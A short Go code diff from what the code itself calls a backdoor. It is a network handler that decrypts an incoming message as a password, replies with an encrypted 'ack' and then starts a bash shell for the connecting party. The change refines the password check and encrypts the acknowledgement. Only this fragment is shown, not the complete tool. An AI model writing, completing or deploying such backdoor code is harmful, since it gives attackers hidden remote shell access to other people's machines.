@@ -122,7 +122,7 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
-	// Check that the next message is a magic word
+	// Check that the next message is the correct password
 	readLen, _ = conn.Read(buf)
 	tempBuf := buf[:readLen]
 	pt, err := open(tempBuf, info, gcm)
@@ -135,11 +135,8 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
-	// Ack the connection
-	// Todo create easy to use seal function
-	conn.Write([]byte("ack"))
-
-	// Check the password for this backdoor
+	// Ack the connection, password is correct
+	conn.Write(seal([]byte("ack"), info, gcm))
 
 	// Start the shell
 	fmt.Println("Starting bash")
